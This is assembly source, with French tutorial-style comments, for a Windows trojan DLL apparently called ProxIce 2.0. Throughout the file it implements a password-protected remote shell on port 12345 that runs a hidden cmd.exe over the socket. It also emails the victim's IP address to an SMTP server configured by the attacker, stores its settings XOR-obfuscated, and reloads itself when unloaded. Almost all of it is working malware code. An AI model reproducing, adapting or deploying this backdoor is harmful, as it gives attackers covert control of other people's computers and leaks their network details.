.386
.MODEL flat,stdcall

OPTION CASEMAP:NONE
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\rasapi32.inc
include \masm32\include\advapi32.inc
include \masm32\include\shell32.inc
include \masm32\include\wsock32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\shell32.lib
includelib  \masm32\lib\masm32.lib
includelib \masm32\lib\rasapi32.lib
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\wsock32.lib

_Notification PROTO

.DATA
Xor_Key			EQU		200
Port_Smtp		EQU		25
Port_Cmd		EQU		12345
sz_Exit			DB		"exit",10,0
sz_Present		DB		"Bienvenue dans ProxIce v 2.0, by Icingtaupe for n0name.",13,10,0
sz_EnterPass	DB		"Veuillez entrer le password : ",0
sz_BadPass		DB		"Mauvais Password.",13,10,0
sz_Password		DB		"                                   ",0
sz_SmtpServer	DB		"                                 ",0				; On retrouve les endroits dont on avait parl� dans l'editserver
sz_Helo			DB		"helo                                  ",13,10,\
						"mail from :                                     ",13,10,\
						"rcpt to :                                       ",13,10,\
						"data",13,10,"IP de la Victime : ",0 
sz_EndToSend	DB		13,10,13,10,"Okay, now it's all right. Have a Good Day :]",\
						13,10,13,10,13,10,".",13,10,13,10,"quit",13,10,0
sz_DllName		DB		"ws_sk32.dll",0
sz_Cmd			DB		"cmd.exe",0

.data?
Tr_Connection 		RASCONN 0FFh dup ({})
sz_WsaData			WSADATA<> 
sz_WsaData_			WSADATA<> 
ProcInfo			PROCESS_INFORMATION<>
Startup				STARTUPINFO<>
Sat					SECURITY_ATTRIBUTES<>
SockAdress			sockaddr_in<>
SockAdress_			sockaddr_in<>

hClientSock			DD ?
hSock				DD ?
hCon	   			DD ?
hShellOutToSocket	DD ?
hShellOutShell		DD ?
hShellInToSocket	DD ?
hShellInShell		DD ?

sz_BytesWritten		DD	?
sz_BytesRead		DD	?
RasCon_Buf  		DD ?
TID					DD ?

sz_VicIP			DB 	40  DUP(?)
sz_LocalHostname	DB	256 DUP(?)
sz_ToSend			DB	400 DUP(?)
sz_RecvBuffer		DB	80000 DUP(?)
sz_Buffer			DB	80000 DUP(?)

.code

_ListenThread proc
LOCAL hSockListen:DWORD
		
	@The_Beginning:
	Push 200
	Call Sleep		; On commence par attendre un peu, ne soyons pas trop gourmands.
		
	Push OFFSET sz_WsaData_
	Push 101h
	Call WSAStartup	; On commence, c'est parti, on initialise le systeme de socket et Winsock

	Push 0
	Push SOCK_STREAM
	Push AF_INET
	Call socket			; On cr�e notre socket, certes, il est donc allou�. A noter qu'il n'est pas ecoute, ni rien
	Mov  hSockListen, EAX
	
	Mov EAX, Port_Cmd	; On calcule le port que l'on doit specifier. On pourrait utiliser l'API htons, mais 
	Rol AX, 8			; elle r�alise en r�alit� ces deux op�rations ( Mov EAX, Port_Cmd / Rol AX, 8 )
	Mov SockAdress.sin_port, AX	; on remplit la structure pour notre futur socket qui �coute avec le resultat
	Mov SockAdress.sin_family, AF_INET	; On d�finit le type de socket
	Mov SockAdress.sin_addr, INADDR_ANY	; n'importe qui peut acceder a notre socket futur

	@AcceptLoop:
	Push hClientSock
	Call closesocket		; on sait jamais, si il y a eu une connexion, on ferme le socket, ca evite les bugs.
		
	Push SIZEOF SockAdress
	Push OFFSET SockAdress ; on bind notre socket, on le cr�e donc et il est sp�cifi� sur le port sp�cifi� aussi,
	Push hSockListen	   ; bref, tout le blabla, il commence a vraiment prendre forme.
	Call bind			

	Push SOMAXCONN		; on prend le maximum de connexions possibles
	Push hSockListen
	Call listen			; Yeah, on le met en �coute !
	
	Push 0
	Push 0
	Push hSockListen
	Call accept		 ; on attend pour une connexion :] Soyons patients :]
	Mov  hClientSock, EAX	; On bouge un handle du socket distant, de EAX vers a variable hClientSock
	
	Push OFFSET sz_Present
	Call lstrlen	; on envoie les phrases "bienvenue dans machin machin, blabla ..", donc, on calcule sa taille
	
	Push 0
	Push EAX
	Push OFFSET sz_Present
	Push hClientSock
	Call send 	; on l'envoie a celui qui vient de se connecter, le bougre
	
	@AskPassword:
	Push OFFSET sz_EnterPass	; on calcule la taille du "Veuillez entrer votre pass !"
	Call lstrlen
	
	Push 0
	Push EAX
	Push OFFSET sz_EnterPass
	Push hClientSock
	Call send		; on envoie au gars qui s'est connect�
	
	Push 0
	Push SIZEOF sz_RecvBuffer
	Push OFFSET sz_RecvBuffer
	Push hClientSock
	Call recv	; et, fiers et droits, on attend notre r�ponse. Autrement, on bouge pas !
	
	Cmp  EAX, SOCKET_ERROR	; Sgrouarf, il s'est d�conn�ect� du port. Bon,
	Je   @AcceptLoop		; Tant pis, on saute un peu plus haut pour recommencer a �couter pour une connexion
	
	Mov EDI, OFFSET sz_RecvBuffer	; Ha, il a entr� un pass. On le crypte ...
	Mov ESI, EDI
	
	@Decrypt:
		Lodsb						; Petite astuce : Au lieu de d�crypter en m�moire notre vrai password,
		Cmp AL, 0					; on prend celui qui est entr�, on le crypte. Puis, on le compare avec notre pass d�ja crypt�,
		Je @Decrypted				; un peu comme le syteme du MD5, ou rien n'est d�crypt�. 
		Xor AL, Xor_Key				; On a donc notre vrai pass toujours crypt�, que ce soit en m�moire comme "en dur"
		Stosb
		Jmp @Decrypt
	@Decrypted:
		Stosb
	
	Push OFFSET sz_Password
	Push OFFSET sz_RecvBuffer		; La fameuse comparaison des deux pass crypt�s
	Call lstrcmpi
		.IF EAX != 0	; Il se paye notre t�te, c'est m�me pas le bon pass !
			Push OFFSET sz_BadPass
			Call lstrlen	; On calcule la taille de la phrase qui dit "Bip, pas bon !"
			
			Push 0
			Push EAX
			Push OFFSET sz_BadPass
			Push hClientSock
			Call send		; On envoie au gars connect�
			
			Push SIZEOF sz_RecvBuffer
			Push OFFSET sz_RecvBuffer
			Call RtlZeroMemory	; On vide le buffer qui a contenu la r�ponse
			
			Jmp @AskPassword	; On redemande le password, en sautant un peu plus haut, a l'endroit ou l'on demande.
			
		.ELSE
			Push SIZEOF sz_RecvBuffer
			Push OFFSET sz_RecvBuffer
			Call RtlZeroMemory			; On vide le buffer qui a contenu le password
				
			Mov Startup.cb,sizeof STARTUPINFO	; On pr�pare la structure Startup pour cmd.Exe 
			Mov Startup.lpReserved,NULL
			Mov Startup.lpTitle,NULL
			Mov Startup.lpDesktop,NULL
			Mov Startup.wShowWindow,SW_HIDE		; Lui, par conte, on le lance en cach� !
			Mov Startup.lpReserved2,NULL
			Mov Startup.cbReserved2,0
			Mov ebx,STARTF_USESHOWWINDOW OR STARTF_USESTDHANDLES	; oui, on modifiera les Std Handles
			Mov Startup.dwFlags,ebx				; On lui dit que l'on a utilis� les flags pour montrer ou non le prog'
			
			Mov Sat.nLength, SIZEOF Sat			; On initialise la structure Sat
			Mov Sat.lpSecurityDescriptor, NULL
			Mov Sat.bInheritHandle, TRUE		; Oui, les handles sont h�rit�s 
				
			Push 0
			Push OFFSET Sat						; On cr�e un pipe ( -> tunnel, en gros ), pour renvoyer 
			Push OFFSET hShellOutShell			; les donn�es sur le socket
			Push OFFSET hShellOutToSocket
			Call CreatePipe						
			
			Push 0
			Push OFFSET Sat						; on cr�e un autre pipe pour les donn�es entrantes
			Push OFFSET hShellInToSocket
			Push OFFSET hShellInShell
			Call CreatePipe
		
			Push hShellOutShell					; On dit de renvoyer l'output standart sur un bout du pipe
		    Pop  Startup.hStdOutput
		    Push hShellInShell					; L'input sur un autre ..
		    Pop  Startup.hStdInput
		    Push hShellOutShell
		    Pop  Startup.hStdError				; Et les erreurs sur encore un autre
		        
		    Push OFFSET ProcInfo
		    Push OFFSET Startup
		    Push 0
		    Push 0
		    Push 0
		    Push TRUE
		    Push 0
		    Push 0
		    Push OFFSET sz_Cmd
		    Push 0
		    Call CreateProcess				; On finit par lancer le processus cmd.exe, joyeux lurons que nous sommes :]
		  	
		  	Push 300
		  	Call Sleep
		  	
			Push hShellInShell				; On ferme le handle vers le premier pipe, sinon le tout foire
			Call CloseHandle				; ( oui, car dans ce cas le pipe a, pour une seule sortie, 2 bouts d'�criture
											; ou lecture .. par cons�quent, �a marchera pas. )
			Push hShellOutShell				; On ferme donc les handles des pipes, mais ceux vers cmd.exe sont toujours actif :]
			Call CloseHandle
			
			Push 300
			Call Sleep
			
			@loop:
			.WHILE TRUE 
				Push 100
				Call Sleep
				
				Push 0
				Push 0
				Push OFFSET sz_BytesRead ; On regarde s'il y a des donn�es a grapiller sur l'entr�e du pipe, vers le socket
				Push SIZEOF sz_Buffer	; a noter que cette fonction ne retire pas les donn�es du pipe, elles restent en attente
				Push OFFSET sz_Buffer	; on obtient juste combien il y a de donn�es a prendre
				Push hShellOutToSocket
				Call PeekNamedPipe			
				
					.WHILE sz_BytesRead > 0
						Push OFFSET sz_Buffer
						Call lstrlen		; on calcule combien la fonction a retourn�, et combien on doit lire
											; tant qu'il y a des donn�es a lire, on repete les op�rations qui suivent.
						Push 0
						Push OFFSET sz_BytesRead
						Push EAX				; On lit sur le pipe, a la diff�rence que cette API retire les donn�es en attente
						Push OFFSET sz_Buffer	; du pipe
						Push hShellOutToSocket
						Call ReadFile		
							.IF EAX == TRUE
								Push OFFSET sz_Buffer
								Call lstrlen			; on calcule quelle taille fait le buffer
								
						   		Push 0
						   		Push EAX
						   		Push OFFSET sz_Buffer
		   						Push hClientSock		; et on envoie tout ca au client !
		   						Call send
		   						
		   						Push 80000
		   						Push OFFSET sz_Buffer	; on remet a zero le buffer :]
		   						Call RtlZeroMemory
						.ELSE
							.break
						.ENDIF
						Push 20
						Call Sleep
		
						Push 0
						Push 0
						Push OFFSET sz_BytesRead
						Push 0
						Push 0
						Push hShellOutToSocket
						Call PeekNamedPipe	; On regarde s'il y a encore des donn�es a lire, et on recommence si oui.
					.ENDW
				Push 0
				Push SIZEOF sz_RecvBuffer
				Push OFFSET sz_RecvBuffer
				Push hClientSock		; on attend un envoi de la part du client, afin de r�agir en cons�quence
				Call recv
				   	.IF EAX == 0			; si on envoie rien
		             	.BREAK
		           	.ELSEIF EAX == SOCKET_ERROR	; ou si le client s'est d�co
		             	.BREAK				; on sort de la boucle
		           	.ENDIF
		           	
		        Push OFFSET sz_RecvBuffer
		        Push OFFSET sz_Exit
		        Call lstrcmpi       		; On compare, l'utilisateur a-t-il tap� "exit" ?
		     		.IF EAX == 0				; Oui ? Alors on l'envoie au shell
		     			Push 0						; ca aura pour effet de le faire quitter.
		     			Push OFFSET sz_BytesWritten
		     			Push SIZEOF sz_RecvBuffer
		     			Push OFFSET sz_RecvBuffer
		     			Push hShellInToSocket
		     			Call WriteFile
		     			
				     	Jmp @EndLoop			; on saute a "@EndLoop" ( voir plus bas )
		     		.ENDIF
		     
		     	Push OFFSET sz_RecvBuffer		; on calcule quelle taille �a fait, ce que l'on a recu
		     	Call lstrlen
		
		     	Push 0
		     	Push OFFSET sz_BytesWritten		; on l'envoit au shell
		     	Push EAX
		     	Push OFFSET sz_RecvBuffer
		     	Push hShellInToSocket
		     	Call WriteFile
		          	.IF EAX == 0				; ark, ca a foir�, ou alors on a rien tap�
		                 .BREAK					; on sort de la boucle
		          .ENDIF
		       @next:
		       Push OFFSET sz_RecvBuffer		; on calcule quelle taille fait ce qu'on a recu
		       Call lstrlen
		
		       Push EAX							; on  vide le buffer en cons�quence.
		       Push OFFSET sz_RecvBuffer
		       Call RtlZeroMemory
			.ENDW
			
		    @EndLoop:						; Voici ou l'on atterit si l'on sort de la boucle, ou que l'on a tap� exit
		    Push 0							; au cas ou, si c'est pas d�ja fait on quitte cmd.exe
		    Push ProcInfo.hProcess
		    Call TerminateProcess
		    
		    Push SIZEOF sz_RecvBuffer		; on vide les buffers
		    Push OFFSET sz_RecvBuffer
		    Call RtlZeroMemory
		    
		    Push SIZEOF sz_Buffer
		    Push OFFSET sz_Buffer
		    Call RtlZeroMemory
		        
			Push hClientSock		; on ferme les sockets
			Call closesocket
		    
			Push hSockListen
			Call closesocket
			
			Call WSACleanup			; on d�charge Winsock
			
			Push hShellOutToSocket		; on supprime les pipes ( on fait le m�nage partout, en fait )
			Call DisconnectNamedPipe
			
			Push hShellInToSocket
			Call DisconnectNamedPipe
			
			Push hShellInShell
			Call DisconnectNamedPipe
			
			Push hShellOutShell
			Call DisconnectNamedPipe
			
			Push 200				; on attend 0.2 seconde
			Call Sleep
			Jmp @The_Beginning		; et on retourne au d�but ! Voici donc notre petite fonction de remote shell termin�e, et fonctionnelle :]
		.ENDIF
 Jmp @The_Beginning
_ListenThread EndP


DllEntry proc hInstance:HINSTANCE, reason:DWORD, reserved1:DWORD
	.if reason==DLL_PROCESS_ATTACH		; Voici l'endroit ou l'on arrive lors du chargement de la DLL
		Push 1000
		Call Sleep						; on attend 1 seconde
		
		Push OFFSET TID
		Push 0
		Push 0
		Push OFFSET _Notification
		Push 0
		Push 0
		Call CreateThread				; on cr�e un nouveau thread qui se charge de la notif' Mail
		
		Push OFFSET TID
		Push 0
		Push 0
		Push OFFSET _ListenThread
		Push 0
		Push 0
		Call CreateThread				; on cr�e un nouveau thread qui se charge du remote shell :]
		
		Push 2000
		Call Sleep
		
	.elseif reason== DLL_PROCESS_DETACH		; Ha, on doit d�charger la DLL ?
		Push 2000
		Call Sleep
		
		Push OFFSET sz_DllName
		Call LoadLibrary					; Pas de prob', on attend 2 secondes, et on la recharge :P
		
	.endif
		Mov EAX, TRUE
		Ret
DllEntry Endp

_Notification Proc
LOCAL Tstatus:RASCONNSTATUS
	Xor  EBX, EBX				; on met le registre EBX a 0
	Mov EDI, OFFSET sz_Helo		; proc�dure pour d�crypter les donn�es pour le serveur SMTP, c'est a dire tout le tintouin :
	Mov ESI, EDI				; helo smtp.mail.com
								; mail from: <envoyeur@mail.com> ... etc ...
	@Decrypt1:
		Lodsb
		Cmp AL, 0
		Je @Decrypted1
		Xor AL, Xor_Key
		Stosb
		Jmp @Decrypt1
	@Decrypted1:
		Stosb
	
	Mov EDI, OFFSET sz_SmtpServer	; Avant de vouloir envoyer le mail, il serait bon de savoir a quel serveur
	Mov ESI, EDI					; il faut se connecter, non ? Donc, on d�crypte le serveur SMTP. :]
	
	@Decrypt:
		Lodsb
		Cmp AL, 0
		Je @Decrypted
		Xor AL, Xor_Key
		Stosb
		Jmp @Decrypt
	@Decrypted:
		Stosb
		

@Begin:										; Petite proc�dure pour verifier si on est connect� a internet ou pas :)
Mov  DWORD PTR Tstatus.dwSize, 160
Mov  Tr_Connection.dwSize, SIZEOF RASCONN + 1
Mov  RasCon_Buf, SIZEOF Tr_Connection

Invoke RasEnumConnections, ADDR Tr_Connection.dwSize, ADDR RasCon_Buf, ADDR hCon

.IF EAX != 0	
	Push 2000
	Call Sleep
	
	JMP @Begin
.ENDIF

Invoke RasGetConnectStatus, Tr_Connection.hrasconn, ADDR Tstatus

.IF Tstatus.rasconnstate == 2000h	; Ha, on est connect�s au net !
	.IF EBX == 0				; on est pas encore pass� par la, on a pas envoy� le mail .. si EBX == 0, pas encore eu connexion ni envoi de mail
		JMP @Connected			; on saute a la proc�dure "@Connected"
	.ELSEIF EBX == 1			; on a d�ja envoy� le mail ! Si EBX == 1, il y a eu connexion et donc envoi du mail, on est d�ja pass� par la !
		JMP @WaitLong			; on va a la proc�dure WaitLong
	.ENDIF
.ELSEIF Tstatus.rasconnstate != 2000h	; Ha, ben on est pas connect�s .. dommage
	.IF EBX == 0				; On est pas encore pass� la, on a donc pas envoy� le mail .. EBX == 0 => pas connect�, pas de mail envoy� 
		JMP @Wait				; on va a la proc�dure Wait
	.ELSEIF EBX == 1			; Oui, on est d�ja pass� la, et on a d�ja envoy� le mail. EBX == 1, pas connect�, mais mail envoy�. 
		Mov EBX, 0				; on remet EBX a 0, pour dire "Hey gars, on est plus connect�"
		JMP @Wait				; On saute a "Wait"
	.ENDIF						; Dans cette proc�dure de test, on utilise EBX en tant que marqueur de connexion :
.ENDIF							; plus tard, apr�s envoi du mail, on met EBX a 1, et l'on test ici sa valeur.
JMP @Wait						; S'il est egal a 1, alors on a envoy� un mail, c'est d�ja fait.

@Wait:
Push 5000					; on attend 5 sec
Call Sleep		
JMP  @Begin					; on retest pour la connexion

@WaitLong:
Push 300000					; on attend treeees longtemps
Call Sleep

JMP @Begin					; et on retest la connexion :]

@Connected:

Push OFFSET sz_WsaData	; on met en route Winsock pour la cr�ation de socket et tout le tintouin
Push 101h
Call WSAStartup

Push 256
Push OFFSET sz_LocalHostname	; petite proc�dure afin de r�cuperer l'IP locale
Call gethostname				; on prend l'hostname du PC local

Push OFFSET sz_LocalHostname	; on tente de r�cuperer le nom du PC local; enfin, son IP
Call gethostbyname

Mov EBX, EAX					; on bouge le r�sultat dans EBX

Assume  EBX: PTR hostent		; petite astuce, pour lister le tout
Mov EAX, [EBX].h_list

Assume EBX: nothing

Mov EBX, EAX
Mov EAX, [EBX]
Mov EAX, [EAX]
Push EAX
Call inet_ntoa				; on obtient alors un numero que l'on passe a inet_ntoa
							; qui nous retourne un offset vers l'IP en version "aaa.bbb.ccc.ddd"
Push EAX
Push OFFSET sz_VicIP		; on bouge donc l'IP dans le buffer sz_VicIP
Call lstrcat

Push OFFSET sz_Helo
Push OFFSET sz_ToSend		; on bouge tout le "helo smtp.mail.com, mail from: ... data ... IP De la Victime :" dans sz_ToSend
Call lstrcat

Push OFFSET sz_VicIP		; on y ajoute l'IP
Push OFFSET sz_ToSend		; on a donc "IP de la Victime : aaa.bbb.ccc.ddd"
Call lstrcat

Push OFFSET sz_EndToSend
Push OFFSET sz_ToSend		; fin de la sequence SMTP, histoire de terminer le tout et envoyer le mail
Call lstrcat

@GetHost:
Push OFFSET sz_SmtpServer
Call inet_addr				;  On tente d'obtenir l'adresse network du serveur STMP, si c'est une IP

.IF EAX == INADDR_NONE		; Hmm .. �a n'a pas march�. Donc, l'utilisateur a fourni un nom du type smtp.mail.com, et non une IP
Push OFFSET sz_SmtpServer
Call gethostbyname			; on cherche donc son numero a partir du DNS
	.IF EAX == 0			; ca n'a pas march� .. on attend une seconde, et on reessaye
	Push 1000
	Call Sleep
	Jmp  @GetHost
	.ENDIF
Mov EAX, [EAX+12]			; ca a march� ? Youpi, donc, on s'arrange pour obtenir un numero valable
Mov EAX, [EAX]
Mov EAX, [EAX]
.ENDIF
Mov  SockAdress.sin_addr, EAX	; allez, on a enfin le resultat, et donc, le numero network du SMTP 
Mov SockAdress.sin_family, AF_INET	; on met le type du socket
Mov EAX, Port_Smtp			; on obtient le port du SMTP, grace a notre simili-htons
Rol AX, 8
Mov SockAdress.sin_port, AX	; on stoque le r�sultat

Push 0
Push SOCK_STREAM
Push AF_INET
Call socket			; on cr�e enfin notre socket !

Mov hSock, EAX

Push SIZEOF SockAdress
Push OFFSET SockAdress
Push hSock
Call bind			; on le bind, pour le faire "exister", comme vu plus haut

@TestConnect:
Push SIZEOF SockAdress
Push OFFSET SockAdress
Push hSock
Call connect		; on tente une connexion au serveur SMTP

	.IF EAX == SOCKET_ERROR	; bah mince, ca marche pas
		Push 1000
		Call Sleep
		
		Jmp @TestConnect	; on recommence :]
	.ENDIF

Push OFFSET sz_ToSend
Call lstrlen

Push 0
Push EAX
Push OFFSET sz_ToSend	; on envoie le tout dans le serveur STMP, c'est a dire tout ce qui est "helo smtp.mail.com .. data 
Push hSock				; ... IP de la Victime ... goodbye .. quit"
Call send			

Push hSock
Call closesocket		; on referme le socket
Mov EBX, 1				; on met EBX a 1 histoire de pouvoir dire "Nous avons envoy� le mail, nous �tios connect�s, �a marche"
JMP @Begin				; et on recommence le tout ! :D

_Notification Endp

End DllEntry
